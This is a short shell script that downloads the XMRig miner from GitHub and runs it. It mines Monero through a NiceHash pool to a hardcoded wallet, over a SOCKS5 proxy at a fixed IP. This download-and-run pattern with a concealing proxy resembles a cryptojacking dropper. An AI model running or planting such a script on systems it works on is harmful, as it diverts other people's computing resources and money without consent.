#!/bin/sh
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz &&
tar xf xmrig-6.17.0-linux-x64.tar.gz &&
cd xmrig-6.17.0 && ./xmrig --cpu-affinity 0xFF --randomx -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.TEST --threads=2 -x socks5://192.252.211.197:14921
